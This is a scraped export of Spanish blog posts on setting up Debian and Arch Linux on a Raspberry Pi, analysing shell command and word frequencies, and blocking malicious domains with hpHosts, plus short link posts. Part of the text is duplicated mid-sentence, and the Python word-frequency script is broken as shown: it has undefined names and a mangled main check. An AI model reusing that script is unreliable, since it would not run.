Cuando queramos volcar la imagen a la tarjeta, lo hacemos a la inversa. Primero, descomprimimos la imagen: bash $ pbzip2 -d my-debian-19-04-2012.img.bz2 Introducimos la tarjeta en el equipo y la desmontamos. En mi caso la tarjeta es el dispositivo /dev/mmcblk0 . Lo podemos comprobar ejecutando: ```bash $ sudo fdisk -l Disco /dev/mmcblk0: 8068 MB, 8068792320 bytes 4 cabezas, 32 sectores/pista, 123120 cilindros, 15759360 sectores en total Unidades = sectores de 1 * 512 = 512 bytes Tamaño de sector (lógico / físico): 512 bytes / 512 bytes Tamaño E/S (mínimo/óptimo): 512 bytes / 512 bytes Identificador del disco: 0x000ee283 Dispositivo Inicio Comienzo Fin Bloques Id Sistema /dev/mmcblk0p1 2048 155647 76800 c W95 FAT32 (LBA) /dev/mmcblk0p2 157696 15368063 7605184 83 Linux /dev/mmcblk0p3 15368064 15759231 195584 82 Linux swap / Solaris ``` En la salida del comando, sólo he puesto la parte referente a la tarjeta SD, por lo que antes de esto nos saldrá la información relativa al disco duro. Y, por último, copiamos nuestra imagen a la tarjeta SD, tal como hicimos la primera vez: bash $ dd bs=1M if=my-debian-19-04-2012.img of=/dev/mmcblk0 Listo, ya la podemos introducir en la Raspberry Pi y encenderla. Instalando Arch Una vez que nos hemos bajado la imagen de Arch y que podemos sobreescribir el contenido de la tarjeta SD sin remordimientos, vamos a instalar Arch. Primero, comprobamos que el archivo descargado es correcto: bash $ sha1sum archlinuxarm-29-04-2012.zip b84d1eaba2ec64982da40ccd7dba06b186f69545 archlinuxarm-29-04-2012.zip Lo descomprimimos: bash $ unzip archlinuxarm-29-04-2012.zip Comprobamos que la imagen se ha descomprimido correctamente: bash $ cd archlinuxarm-29-04-2012/ $ cat archlinuxarm-29-04-2012.img.sha1 19034eb6808a248d30bda99450b03af1a88daf82 archlinuxarm-29-04-2012.img $ sha1sum archlinuxarm-29-04-2012.img 19034eb6808a248d30bda99450b03af1a88daf82 archlinuxarm-29-04-2012.img Y, ahora ya sí, volcamos la imagen a la tarjeta SD: bash $ dd bs=1M if=archlinuxarm-29-04-2012.img of=/dev/mmcblk0 Primera actualización Lo primero será actualizar el sistema. Esta chuleta del gestor de paquetes de Arch , pacman , nos vendrá bien si estamos acostumbrados a aptitude : bash [root@alarmpi ~]# pacman -Syu Esto nos advertirá de que hay una actualización del paquete pacman y que si queremos actualizar éste primero. bash :: The following packages should be upgraded first : pacman es :: Do you want to cancel the current operation :: and upgrade these packages now? [Y/n] n Por ahora le diremos que no, ya que nos puede evitar algunos problemas . A continuación realizará la actualización del sistema: bash :: Starting full system upgrade... :: Replace libusb with core/libusbx? [Y/n] :: Replace procps with core/procps-ng? [Y/n] :: Replace udev with core/systemd-tools? [Y/n] resolving dependencies... looking for inter-conflicts...Lo primero será actualizar el sistema. Esta chuleta del gestor de paquetes de Arch, pacman, nos vendrá bien si estamos acostumbrados a aptitude: bash [root@alarmpi ~]# pacman -Syu Esto nos advertirá de que hay una actualización del paquete pacman y que si queremos actualizar éste primero. bash :: The following packages should be upgraded first : pacman es :: Do you want to cancel the current operation :: and upgrade these packages now? [Y/n] n Por ahora le diremos que no, ya que nos puede evitar algunos problemas . A continuación realizará la actualización del sistema: bash :: Starting full system upgrade... :: Replace libusb with core/libusbx? [Y/n] :: Replace procps with core/procps-ng? [Y/n] :: Replace udev with core/systemd-tools? [Y/n] resolving dependencies... looking for inter-conflicts... error: failed to commit transaction (conflicting files) bash error: failed to commit transaction (conflicting files) filesystem: /var/lock exists in filesystem filesystem: /var/run exists in filesystem Errors occurred, no packages were upgraded. Por algún motivo, al actualizar se encontraron archivos que ya existían , y en lugar de sobre escribirlos, nos avisa y aborta la actualización. Lo que podemos hacer en este caso es comprobar si los archivos pertenecen a algún paquete mediante: bash [root@alarmpi ~]# pacman -Qo /var/lock error: No package owns /var/lock Si el archivo no pertenece a ningún paquete, lo renombraremos y volveremos a intentar actualizar. Si todo va bien, podemos borrar el archivo. bash [root@alarmpi ~]# mv /var/lock{,.bak} Usuarios, contraseñas, privilegios Tras arrancar la Raspberry Pi, lo primero que haremos será cambiar la contraseña de root : bash [root@alarmpi ~]# passwd root La cuenta de root sólo se debería utilizar para tareas de administración, por lo que crearemos un nuevo usuario para uso cotidiano: bash [root@alarmpi ~]# useradd -m -g users -G audio,lp,optical,storage,video,wheel,games,power,scanner -s /bin/bash archie Si queremos utilizar sudo , para evitar tener que iniciar sesión como root , primero tenemos que instalarlo: bash [root@alarmpi ~]# pacman -S sudo Una vez instalado, editaremos el fichero /etc/sudoers mediante el comando visudo . ES IMPORTANTE utilizar visudo y no otro editor, porque un error podría dejar la cuenta de root inaccesible. bash [root@alarmpi ~]# visudo Al crear nuestro usuario, lo hemos añadido al grupo wheels , que será el que utilicemos para permitir el uso de sudo , por lo que buscamos la siguete linea y la descomentamos: bash %wheel ALL=(ALL) ALL Para añadir autocompletado a sudo , editamos el fichero ~/.bashrc y añadimos: bash complete -cf sudo Si la cuenta que hemos creado puede utilizar sudo , podemos deshabilitar la cuenta de root , aunque ya nos advierten de que esto podría causar algún problema. Para deshabilitarla: bash [myusername@alarmpi ~]$ sudo passwd -l root passwd: password expiry information changed. Si queremos volver a habilitarla: bash [myusername@alarmpi ~]$ sudo passwd -u root Instalando algunos paquetes Nada más conectarme por SSH, echo en falta algunos paquetes, aunque es algo que tiene fácil y rápida solución: bash [myusername@alarmpi ~]$ sudo pacman -S htop vim byobu es como screen pero mejor, aunque no se encuentra en los repositorios oficiales , sí está en los de usuario, AUR. Si queremos instalarlo: bash [myusername@alarmpi ~]$ cd /tmp [myusername@alarmpi ~]$ wget http://aur.archlinux.org/packages/by/byobu/byobu.tar.gz [myusername@alarmpi ~]$ tar zxf byobu.tar.gz [myusername@alarmpi ~]$ cd byobu [myusername@alarmpi ~]$ makepkg Si falta alguna dependencia, nos lo hará saber. En este caso, instalé las siguientes: bash [myusername@alarmpi ~]$ sudo pacman -S fakeroot tmux libnewt python2 patch make Una vez satisfechas las dependencias, creamos el paquete y lo instalamos: bash [myusername@alarmpi ~]$ makepkg [myusername@alarmpi ~]$ sudo pacman -U *.xz Si queremos tener la hora del sistema actualizada de forma automática, instalamos el paquete openntpd : bash [myusername@alarmpi ~]$ sudo pacman -S openntpd Y editamos el fichero /etc/rc.conf para comprobar que se ejecuta la sincronización de openntpd al inicio y que el servicio hwclock está bloqueado (tiene una exclamación delante de su nombre): ```bash al final del fichero... DAEMONS=(!hwclock syslog-ng network openntpd @netfs @crond @sshd) ``` hostname e IP estática Si queremos cambiar el hostname editamos el fichero /etc/rc.conf y modificamos el valor de la variable HOSTNAME . Para cambiar la configuración de red y asignarle una IP estática , en el mismo fichero /etc/rc.conf y añadimos nuestra configuración en la sección correspondiente: bash interface=eth0 address=192.168.1.51 netmask=255.255.255.0 broadcast=192.168.1.255 gateway=192.168.1.1 Reiniciamos el servicio: bash [myusername@alarmpi ~]$ sudo /etc/rc.d/network restart Si estábamos conectados por SSH, se cerrará la conexión y tendremos que volver a conectarnos, entonces nos aparecerá una alerta diciéndonos que la identificación del equipo remoto ha cambiado. Para solucionarlo, ejecutamos: bash $ ssh-keygen -f \"~/.ssh/known_hosts\" -R 192.168.1.51 Entorno gráfico Si queremos instalar LXDE para tener un entorno gráfico: bash [myusername@alarmpi ~]$ sudo pacman -S lxde xorg-xinit xf86-video-fbdev Lo iniciamos: bash [myusername@alarmpi ~]$ xinit /usr/bin/lxsession Referencias » Raspberry Pi » Beginners' Guide » Arch Linux Arm: First steps » pacman: gestor de paquetes de Arch » Arch Linux ARM: Raspberry Pi Forum","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/22/arch-en-raspberry-pi/","loc":"https://karpoke.ignaciocano.com/2012/06/22/arch-en-raspberry-pi/"},{"title":"The Linux Graphics Stack","text":"This is an introductory overview post for the Linux Graphics Stack, and how it currently all fits together. I initially wrote it for myself after having conversations with people like Owen Taylor, Ray Strode and Adam Jackson about this stack. I had to go back to them every month or so and learn the stuff from the ground up all over again, as I had forgotten every single piece. I asked them for a good high-level overview document so I could stop bothering them. They didn't know of any. I started this one. It has been reviewed by Adam Jackson and David Airlie, both of whom work on this exact stack. » mecheye.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/22/the-linux-graphics-stack/","loc":"https://karpoke.ignaciocano.com/2012/06/22/the-linux-graphics-stack/"},{"title":"Distribución de frecuencias","text":"Distribución de los comandos más utilizados Una de esas combinaciones de comandos curiosas es aquella que nos devuelve un listado de los comandos más utilizados ordenados por frecuencia, en este caso limitado a los más frecuentes: bash $ history | awk '{a[$2]++} END {for (i in a) { print a[i] \" \" i }}' | sort -rn | head 62 cd 50 sudo 45 vim 39 ls 32 ssh 25 wget 23 memento.sh 23 cat 9 curl 9 man A partir de estos datos, podemos obtener una distribución de su frecuencia de uso en relación al número total de comandos diferentes utilizando el paquete estadístico R: bash $ history | awk '{a[$2]++}END{for(i in a){print a[i] \" \" i}}' | sort -rn > cmd_hist.txt $ R --no-save << EOF jpeg('cmd_hist.jpg') cmd<-read.table('cmd_hist.txt') par(cex=1.2) plot(log(1:length(cmd[,1])),log(cmd[,1]), pch=20, xlab='log(Rank)', ylab='log(frequency)') fit<-lm(log(cmd[,1])~log(1:length(cmd[,1]))) abline(fit,lty=2) EOF Esta es la imagen resultante: Se cumple que un reducido número de comandos se repiten la mayoría de las veces. En particular, aunque el historial en este caso contiene 500 entradas, para los comandos más utilizados sólo se han utilizado unos 90 comandos diferentes: bash $ echo $HISTSIZE 500 $ history | wc -l 500 $ history | awk '{a[$2]++}END{for(i in a){print a[i] \" \" i}}' | sort -rn | wc -l 87 La diferencia estriba en que hay comandos que se utilizan repetidamente pero con diferentes argumentos. Distribución de la longitud del nombre de los comandos De la misma manera que se calcula la distribución de la frecuencia de los comandos más utilizados, podemos calcular la distribución de la longitud de los comandos disponibles. Si estamos en el terminal, en una línea nueva, sin haber escrito nada, y pulsamos dos veces el tabulador (ejecutamos el autocompletado), nos preguntara si queremos mostrar todas las posibilidades. Algo así: bash $ [TAB][TAB] Display all 6472 possibilities? (y or n) Estas posibilidades son cada uno de los programas incluidos en el path del sistema, así como comandos propios del shell o alias que hayamos definido. Si nos fijamos únicamente en los programas a lo que se puede acceder desde el path : bash $ for p in $(sed 's/:/\\n/g' <<< $PATH); do for cmd in $(find $p -maxdepth 1 -executable -printf '%p\\n'); do # remove prefix cmd=${cmd##*/} echo \"${#cmd} $cmd\" done done | sort -rn > cmd_len.txt $ wc -l cmd_len.txt 5838 cmd_len.txt Si queremos obtener la distribución de la longitud de sus nombres, podemos ejecutar: bash $ R --no-save << EOF jpeg('cmd_len.jpg') cmd<-read.table('cmd_len.txt') par(cex=1.2) plot(log(1:length(cmd[,1])),log(cmd[,1]), pch=20, xlab='log(length)', ylab='log(frequency)') fit<-lm(log(cmd[,1])~log(1:length(cmd[,1]))) abline(fit,lty=2) EOF Este es el resultado: Aquí la pendiente de la curva no es tan acusada, es decir, aunque la mayoría de los comandos tienen nombres cortos y la frecuencia decrece a medida que aumenta la longitud, esta variación se produce de forma paulatina hasta el final, donde ya sí cae en picado. Esto no ocurre con los lenguajes humanos, por lo que debe haber una explicación; y quizá tenga que ver con el autocompletado. Gracias a éste, no importa tanto la longitud de un comando sino el número de pulsaciones necesarias para poder identificarlo de forma única y poder así completar su nombre con una pulsación de tabulador. También hay otros comandos que serán ejecutados mediante un click de ratón. Por esto, podría ser que se priorice claridad y legibilidad sobre longitud en los nombres de los comandos. Distribución de palabras Tras haber visto la distribución de la frecuencia de los comandos más utilizados y la distribución de la frecuencia de la longitud de los comandos disponibles, podemos calcular la distribución de la frecuencia de las palabras de un texto. El texto que voy a utilizar es la Advanced Bash-Scripting Guide . bash $ lynx -dump http://tldp.org/LDP/abs/html/abs-guide.html > abs-guide.txt Separaremos las palabras del texto, convertiremos las palabras a minúsculas, eliminaremos los signos de puntuación, las ordenaremos y las contaremos con el siguiente script en Python, word-frequency.py : ```python !/usr/bin/env python encoding: utf-8 import re import sys from string import punctuation def main(filename): word_freq = {} word_list = [] try: # After the statement is executed, the file f is always closed, # even if a problem was encountered while processing the lines. with open(filename) as f: word_list = re.split('\\s+', file(filename).read().lower()) except IOError as e: print \"I/O error({0}): {1}\".format(e.errno, e.strerror) except: print \"Unexpected error:\", sys.exc_info()[0] raise for word in word_list: word = word.translate(None, string.punctuation) if len(word): word_freq[word] = word_freq.get(word,0) + 1 freq_list = [(val, key) for key, val in word_freq.items()] freq_list.sort(reverse=True) for freq, word in reverse(freq_list): print freq, word def usage(): print \"Usage:\", sys.argv[0], \" \" if name == \" main \": if len(sys.argv) < 2: usage() else: main(sys.argv[1]) ``` Creamos el archivo con el número de apariciones de cada palabra: bash $ python word-frequency.py abs-guide.txt > word_freq.txt $ wc -l word_freq.txt 26895 word_freq.txt $ head word_freq.txt 7163 the 5448 a 4423 echo 3836 of 3805 to 2555 in 2511 is 2273 and 1794 this 1776 for Una vez más, recurrimos a R para generar la gráfica de la distribución: bash $ R --no-save << EOF jpeg('word_freq.jpg') cmd<-read.table('word_freq.txt') par(cex=1.2) plot(log(1:length(cmd[,1])),log(cmd[,1]), pch=20, xlab='log(Rank)', ylab='log(frequency)') fit<-lm(log(cmd[,1])~log(1:length(cmd[,1]))) abline(fit,lty=2) EOF Este es el resultado: Aquí la curva es diferente al caso anterior, conforme aumenta el número de palabras distintas decrece su frecuencia de uso. Sin embargo, el texto escogido es un texto escrito en ingles, un texto técnico con ejemplos de código, por lo que tampoco podemos sacar conclusiones sobre el uso del lenguaje, o al menos no en su uso más amplio. Para terminar, esta es la distribución que obtenemos del Quijote : bash $ wget http://www.gutenberg.org/cache/epub/2000/pg2000.txt -O quijote-pg2000.txt $ python word-length.py Descargas/quijote-pg2000.txt > quijote_freq.txt $ wc -l quijote_freq.txt 23059 quijote_freq.txt $ head quijote_freq.txt 20626 que 18216 de 18188 y 10363 la 9880 a 8241 en 8210 el 6345 no 4748 los 4707 se bash $ R --no-save << EOF jpeg('quijote_freq.jpg') cmd<-read.table('quijote_freq.txt') par(cex=1.2) plot(log(1:length(cmd[,1])),log(cmd[,1]), pch=20, xlab='log(Rank)', ylab='log(frequency)') fit<-lm(log(cmd[,1])~log(1:length(cmd[,1]))) abline(fit,lty=2) EOF Curiosamente, se parece bastante a la anterior. Referencias » Distribution of Oft-Used Bash Commands » The Project Gutenberg EBook of Don Quijote » Advanced Bash-Scripting Guide","tags":"dev","url":"https://karpoke.ignaciocano.com/2012/06/22/distribucion-de-frecuencias/","loc":"https://karpoke.ignaciocano.com/2012/06/22/distribucion-de-frecuencias/"},{"title":"hpHosts, evitando la navegación por dominios maliciosos","text":"Cuando navegamos por Internet, no somos conscientes de muchas de las conexiones a diferentes dominios que se están llevando a cabo. Desde páginas web que cargan o envían datos a otros dominios nada más visitarlas, hasta casos de phishing o conexiones realizadas por virus o troyanos. hpHosts es un proyecto que mantiene una recopilación de dominios cuyo contenido es malicioso, suplanta a otro ( phishing ), busca estafarnos o está relacionado con spam . Incluyendo esta recopilación en nuestro fichero /etc/hosts nos aseguramos de que si una página quiere acceder a alguno de estos dominios no lo consiga, ya que se consulta el archivo /etc/hosts antes de hacer una resolución de dominio. Descargamos el archivo y lo descomprimimos: bash $ wget http://support.it-mate.co.uk/downloads/hphosts.zip $ md5sum hphosts.zip 85b34ff1f7803bf6e4a314eaa4f02ac8 $ unzip -d hphosts hphosts.zip $ cd hphosts El fichero comprimido, además del archivo HOSTS.txt , contiene la licencia de usuario, un fichero con información relativa al proyecto y una firma PGP del fichero HOSTS.txt . Comprobamos la firma: bash $ gpg --verify HOSTS.txt.sig HOSTS.txt gpg: Firmado el dom 20 may 2012 21:35:05 CEST usando clave DSA ID 155DA479 gpg: Imposible comprobar la firma: Clave pública no encontrada Si no puede comprobar la firma porque no tenemos la clave, la importamos: bash $ gpg --recv-keys 155DA479 gpg: solicitando clave 155DA479 de hkp servidor keys.gnupg.net gpg: clave 155DA479: clave pública \"Steven Burn \" importada gpg: Cantidad total procesada: 1 gpg: importadas: 1 Volvemos a comprobar la firma del fichero HOSTS.txt : bash $ gpg --verify HOSTS.txt.sig HOSTS.txt gpg: Firmado el dom 20 may 2012 21:35:05 CEST usando clave DSA ID 155DA479 gpg: Firma correcta de ;`Steven Burn ;' gpg: AVISO: ¡Esta clave no está certificada por una firma de confianza! gpg: No hay indicios de que la firma pertenezca al propietario. Huellas dactilares de la clave primaria: ECF9 1962 5929 2940 0501 1170 D0D4 353E 155D A479 Vemos que la firma es correcta, aunque no esté certificada por una firma de confianza, por lo que no podríamos asegurar que la firma sea de Steven Burn, pero sí que la firma del fichero pertenece a esa dirección de correo electrónico. En la cabecera del fichero podemos ver la fecha de actualización: ```bash $ head HOSTS.txt hpHosts last updated on: 07/06/2012 01:15 hpHosts last verified by Steven Burn: 01/06/2012 02:00 IMPORTANT: Rename this file to \"HOSTS\" (no .txt extension) Support: http://mysteryfcm.co.uk/?mode=contact http://forum.hosts-file.net Download: http://hosts-file.net/?s=Download Mirrors: http://hosts-file.net/?s=Help#dlmirrors ``` Si tenemos curiosidad, podemos ver que en el archivo hay más de 180K dominios: bash $ grep -c &#94;127.0.0.1 HOSTS.txt 186434 Por último, adjuntamos el contenido del fichero HOSTS.txt a nuestro /etc/hosts , eliminando antes los retornos de carro \\r que contiene (para que no aparezcan como &#94;M cuando lo editamos con vim , por ejemplo): bash $ tr -d '\\r' < HOSTS.txt | sudo tee -a /etc/hosts >/dev/null Podemos saber si un sitio ha sido incluido en la lista consultando el catálogo , o utilizando directamente la siguiente URL: http://hosts-file.net/?s=URL , por ejemplo: http://hosts-file.net/?s=www.stackoverflow.com . Y si queremos saber el motivo , en esta otra. Referencias » http://hosts-file.net » Protección a nivel local, archivo hosts","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/21/hphosts-evitando-la-navegacion-por-dominios-maliciosos/","loc":"https://karpoke.ignaciocano.com/2012/06/21/hphosts-evitando-la-navegacion-por-dominios-maliciosos/"},{"title":"Mario5","text":"In the history of computer games some games have created and carried whole companies on their shoulders. One of those games is certainly Mario Bros. The Mario character first appeared in the game Donkey Kong and became very famous within its own game series starting with the original Mario Bros. in 1983. Nowadays a lot of spin-offs and 3D jump and runs are being produced centering the Mario character. In this article we will develop a very simple Super Mario clone, which is easily extendible with new items, enemies, heros and of course levels. The code of the game itself will be written in object oriented JavaScript. Now that sounds like a trap since JavaScript is a prototype based scripting language, however, there are multiple object oriented like patterns possible. We will investigate some code which will give us some object oriented constraints. This will be very useful to stay in the same pattern through the whole coding. » codeproject.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/21/mario5/","loc":"https://karpoke.ignaciocano.com/2012/06/21/mario5/"},{"title":"Regular Expression Matching Can Be Simple And Fast","text":"Historically, regular expressions are one of computer science's shining examples of how using good theory leads to good programs. They were originally developed by theorists as a simple computational model, but Ken Thompson introduced them to programmers in his implementation of the text editor QED for CTSS. Dennis Ritchie followed suit in his own implementation of QED, for GE-TSS. Thompson and Ritchie would go on to create Unix, and they brought regular expressions with them. By the late 1970s, regular expressions were a key feature of the Unix landscape, in tools such as ed, sed, grep, egrep, awk, and lex. Today, regular expressions have also become a shining example of how ignoring good theory leads to bad programs. The regular expression implementations used by today's popular tools are significantly slower than the ones used in many of those thirty-year-old Unix tools. This article reviews the good theory: regular expressions, finite automata, and a regular expression search algorithm invented by Ken Thompson in the mid-1960s. It also puts the theory into practice, describing a simple implementation of Thompson's algorithm. That implementation, less than 400 lines of C, is the one that went head to head with Perl above. It outperforms the more complex real-world implementations used by Perl, Python, PCRE, and others. The article concludes with a discussion of how theory might yet be converted into practice in the real-world implementations. Russ Cox | swtch.com/\\~rsc","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/21/regular-expression-matching-can-be-simple-and-fast/","loc":"https://karpoke.ignaciocano.com/2012/06/21/regular-expression-matching-can-be-simple-and-fast/"},{"title":"Microcódigo en mi código","text":"El micro-código corresponde tradicionalmente con la forma más \"pura\" de firmware, instrucciones al fin y al cabo, que controlan una máquina. Si no te suenan los términos, puede ser una lectura interesante si quieres conocer cómo funciona un procesador. Pero no es de hardware de lo que quiero hablar, sino de una forma (curiosa u obvia, de ti depende) de escribir ciertas partes de nuestros programas, que toma la idea básica de las lógicas micro-programadas. » genbetadev.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/21/microcodigo-en-mi-codigo/","loc":"https://karpoke.ignaciocano.com/2012/06/21/microcodigo-en-mi-codigo/"},{"title":"DNSSEC – ¿Qué es y por qué es importante?","text":"Para contactar a otra persona a través de Internet, debe escribir una dirección en su ordenador: un nombre o un número. Esa dirección tiene que ser única para que los ordenadores sepan cómo encontrarse entre sí. ICANN se ocupa de coordinar estos identificadores únicos en todo el mundo. Sin esa coordinación no tendríamos una Internet global. Al escribir un nombre, un sistema debe traducir ese nombre en un número antes de que se pueda establecer la conexión. Ese sistema se denomina Sistema de nombres de dominio (DNS) y traduce nombres como www.icann.org en números, denominados direcciones IP (sigla que corresponde a Protocolo de Internet). ICANN coordina el sistema de direcciones para garantizar que sean únicas. » icann.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/21/dnssec-que-es-y-por-que-es-importante/","loc":"https://karpoke.ignaciocano.com/2012/06/21/dnssec-que-es-y-por-que-es-importante/"},{"title":"Raspberry Pi","text":"En pocas palabras, Raspberry Pi es un ordenador del tamaño de una tarjeta de crédito que puede reproducir vídeo en alta definición (HDMI) y cuesta, dependiendo del modelo, 25$ sin ethernet o 35$ con ethernet [1]. Cuenta con un procesador ARM11 a 700Mhz, 256MB RAM, USB 2.0, conectores de audio y RCA. Se alimenta a través de un puerto mini-USB y tiene una ranura para una tarjeta SD (de hasta 32GB) que es donde se instala el sistema operativo. No tiene WiFi, pero se le puede añadir una antena WiFi USB. Diagrama de Paul Beech Detrás de este proyecto está la fundación Raspberry Pi [2], una entidad sin ánimo de lucro cuyo objetivo es proporcionar un ordenador sencillo y barato a niños de todo el mundo, enfocado a un uso educacional. Una gran cantidad de voluntarios y otras entidades sin ánimo de lucro se están involucrando en este proyecto. La única pega es que tanto la GPU como su controlador es de código cerrado. Las aplicaciones usan llamadas a unas librerías de código privativo que son las que llaman a su vez al controlador libre incluido en el kernel . La API del driver del kernel es específica para éstas. Las primeras unidades se comenzaron a ofrecer a finales de febrero, pero el reducido número de unidades iniciales y la alta demanda han provocado que, por ahora, sólo se pueda comprar una Raspberry Pi por persona, siendo necesario haberse apuntado previamente en lista de espera ya que con cada nueva remesa se sirven según este orden. En mi caso, lo pedí en RS-Online y han pasado unos dos meses hasta que pude hacer el pedido, más otras tres semanas de envío. Hay mucha gente queriendo probarlo :) El pedido básico viene sólo con la placa, ni fuente de alimentación, ni tarjeta SD, ni nada. Todo esto está disponible en RS-Online si queremos, pero realmente no será necesario. Se puede utilizar prácticamente cualquier cargador de móvil con conector mini-USB de fuente de alimentación, que proporcione 5V y, al menos, 700mA para el modelo B (o 300mA en caso del modelo A) [3]. En principio, las tarjetas SD de clase 10 son las que tienen un mejor rendimiento de escritura, aunque la diferencia de una marca a otra puede ser importante [4], pero parece ser que hay algunos problemas con algunos modelos concretos [5]. Para estar seguros de que la tarjeta que utilicemos es compatible, así como otros periféricos USB, podemos consultar esta página [6]. Instalación de debian squeeze Existen varias distribuciones que podremos utilizar como sistema operativo, como fedora, debian o arch, y posiblemente aparecerán más [7]. Debian incluye gcc, Python y algunas aplicaciones de ejemplo. Parece que Ubuntu no va a estar, por ahora, debido a que no da soporte al ARM11 que lleva la placa. En la página de descargas podemos escoger entre las distribuciones adaptadas. Para no sobrecargar el servidor de descargas, podemos descargar el torrent . Si queremos descargar el código fuente, así como las herramientas para compilación cruzada, podemos hacerlo desde la página de GitHub [8]. Una vez que tengamos la imagen, procederemos a instalarla en la tarjeta SD [9]. El proceso es sencillo. Por ejemplo, para instalar debian, después de haber descargado la imagen, comprobamos que es correcta: bash $ sha1sum ~/debian6-19-04-2012.zip 1852df83a11ee7083ca0e5f3fb41f93ecc59b1c8 debian6-19-04-2012.zip Extraemos la imagen: bash $ unzip debian6-19-04-2012.zip Montamos la tarjeta, si no está montada ya, y anotamos qué nombre tiene el dispositivo: bash $ df | grep mmc /dev/mmcblk0p1 7871488 32 7871456 1% /media/FC30-3DA9 En este caso el sufijo p1 indica que está montada la primera partición, pero nosotros queremos la ruta a la tarjeta, no sólo una partición, ya que la imagen creará las particiones, así que nos quedamos con el nombre mmcblk0 . También podría ser que el nombre del dispositivo fuese, por ejemplo, /dev/sdd1 , en cuyo caso el 1 es la partición y el nombre del dispositivo sdd . Desmontamos la tarjeta SD: bash $ umount /media/FC30-3DA9 Volcamos la imagen en la tarjeta SD: bash $ dd bs=1M if=debian6-19-04-2012/debian6-19-04-2012.img of=/dev/mmcblk0 1859+1 registros leídos 1859+1 registros escritos 1950000000 bytes (2,0 GB) copiados, 151,45 s, 12,9 MB/s Aprovechando todo el espacio de la tarjeta SD La imagen está preparada para una tarjeta de 2 GB, si nuestra tarjeta es de un tamaño mayor, podemos redimensionar las particiones creadas por la imagen para utilizar todo el espacio disponible. Esto lo podríamos hacer directamente desde la debian en Raspberry Pi, pero ahora lo haremos desde el terminal de la Ubuntu. Utilizaremos parted con la tarjeta, de 8 GB, aún desmontada: ```bash $ sudo parted /dev/mmcblk0 (parted) unit chs (parted) print Modelo: SD 00000 (sd/mmc) Disco /dev/mmcblk0: 123119,3,31 Tamaño de sector (lógico/físico): 512B/512B Geometría cilindro,cabeza,sector de BIOS: 123120,4,32. Cada cilindro es 65,5kB. Tabla de particiones. msdos Numero Inicio Fin Tipo Sistema de archivos Banderas 1 16,0,0 1215,3,31 primary fat32 lba 2 1232,0,0 26671,3,31 primary ext4 3 26688,0,0 29743,3,31 primary linux-swap(v1) ``` Aquí vemos las particiones que se han creado tras el volcado de la imagen, y que no se usa el espacio desde el cilindro 29743 hasta el último cilindro 123119. La primera partición es la de arranque ( boot ). La segunda es la partición de root y será la que aumentaremos todo lo posible. La tercera partición es la swap , que tenemos que mover hasta al final de la tarjeta. Para mover la partición de swap , primero debemos calcular el número de cilindro a partir del cual la vamos a poner. Para calcular este número utilizamos la siguiente fórmula: bash inicio = (máximo - (final partición 3 - inicio partición 3) - 1 Por ejemplo: bash inicio = (123119 - ( 29743 - 26688)) - 1 = 120063 Seguimos con parted y la movemos: bash (parted) move 3 120063,0,0 Ahora ampliaremos el tamaño de la partición de root , sin que perdamos los datos en ella: bash (parted) rm 2 (parted) mkpart primary 1232,0,0 120062,3,31 (parted) quit El inicio de la partición de root es el mismo que ya tenía y el último es justo antes del de la partición de swap . Ya podemos limpiar y redimensionar la partición con e2fsck (como es la segunda añadimos p2 ): ```bash $ sudo e2fsck -f /dev/mmcblk0p2 # (permitimos añadir lost-and-found) e2fsck 1.42 (29-Nov-2011) Paso 1: Verificando nodos-i, bloques y tamaños Paso 2: Verificando la estructura de directorios Paso 3: Revisando la conectividad de directorios No se encontró /lost+found. Crear? si Paso 4: Revisando las cuentas de referencia Paso 5: Revisando el resumen de información de grupos /dev/mmcblk0p2: EL SISTEMA DE FICHEROS FUE MODIFICADO /dev/mmcblk0p2: 59389/101920 files (0.0% non-contiguous), 310435/407040 blocks ``` bash $ sudo resize2fs /dev/mmcblk0p2 resize2fs 1.42 (29-Nov-2011) Resizing the filesystem on /dev/mmcblk0p2 to 1901296 (4k) blocks. The filesystem on /dev/mmcblk0p2 is now 1901296 blocks long. Sacamos la tarjeta y la introducimos en Raspberry Pi. El usuario por defecto es pi y la contraseña raspberry . Esto será lo primero que cambiaremos. Después de instalar debian Tras arrancar por primera vez la Raspberry Pi, una de las primeras acciones que debemos llevar a cabo, sobre todo si pensamos que se pueda acceder desde fuera de la red, es cambiar la contraseña que viene por defecto. Ejecutamos el comando passwd e introducimos la nueva contraseña. Lo siguiente, actualizar el sistema: bash pi@raspberrypi:~$ sudo apt-get install aptitude pi@raspberrypi:~$ sudo aptitude update && sudo aptitude safe-upgrade Si nuestro teclado no es inglés, podemos configurarlo para nuestro idioma ejecutando: bash pi@raspberrypi:~$ sudo dpkg-reconfigure keyboard-configuration Y para que los cambios tengan efecto: bash pi@raspberrypi:~$ sudo setupcon Instalamos algunos paquetes \"básicos\": bash pi@raspberrypi:~$ sudo aptitude install byobu htop locate vim vlc Añadimos algunos alias , por ejemplo: bash pi@raspberry:~$ cat > .bash_aliases << EOF alias api=\"sudo aptitude install\" alias apu=\"sudo aptitude update\" alias apg=\"sudo aptitude safe-upgrade\" alias ..=\"cd ..\" alias vim=\"vim.tiny\" EOF Si queremos acceder mediante SSH, ya viene con un script que se encarga de arrancar el servidor SSH al inicio. Lo único que tenemos que hacer es renombrar el fichero boot_enable_ssh.rc : bash pi@raspberry:~$ sudo mv /boot/boot_enable_ssh.rc /boot/boot.rc Por defecto, la configuración de SSH es demasiado permisiva. Podemos endurecerla, por ejemplo, cambiando el número de puerto en el que escucha el demonio, utilizando claves para conectarnos , impidiento que el usuario root pueda iniciar sesión ( PermitRootLogin no ), etc. Reiniciamos el servicio para que los cambios tengan efecto: bash pi@raspberry:~$ sudo service ssh restart Antes de cerrar la sesión SSH que tenemos abierta, deberíamos comprobar que podemos acceder de forma remota tras aplicar los cambios, ya que, de lo contrario, nos quedaremos sin poder conectar. Si desde el equipo que nos conectamos, hemos configurado la reutilización de la conexión SSH , estas pruebas se deberán llevar a cabo en otro terminal. Por último, si nos vamos a conectar de forma remota, lo mejor sería asignarle una IP estática. Editamos el fichero /etc/network/interfaces y modificamos la configuración de la tarjeta: bash auto eth0 iface eth0 inet static address 192.168.1.51 netmaks 255.255.255.0 gateway 192.168.1.1 broadcast 192.168.1.255 network 